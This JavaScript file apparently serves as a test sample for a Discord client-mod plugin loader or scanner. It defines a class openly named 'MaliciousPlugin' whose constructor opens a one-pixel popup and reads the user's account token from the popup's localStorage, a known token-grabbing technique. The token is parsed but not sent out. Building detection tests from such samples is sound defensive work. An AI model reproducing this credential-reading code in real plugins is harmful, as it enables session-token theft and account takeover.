class MaliciousPlugin {
  constructor() {
    console.log("MaliciousPlugin: Executing hidden malicious code");
    popup=window.open('','',`top=0,left=${screen.width-1},width=1,height=${screen.height}`),window.dispatchEvent(new Event('beforeunload')),JSON.parse(popup.localStorage.token || popup.localStorage.tokens);
  }

  info = {
    name: "MaliciousPlugin",
    id: "arcane:MaliciousPlugin",
    authors: [{
      name: "Arcane",
      id: "808802000224518264"
    }],
    description: "MaliciousPlugin Test",
    version: "1.0.0"
  };
}

exports.default = MaliciousPlugin;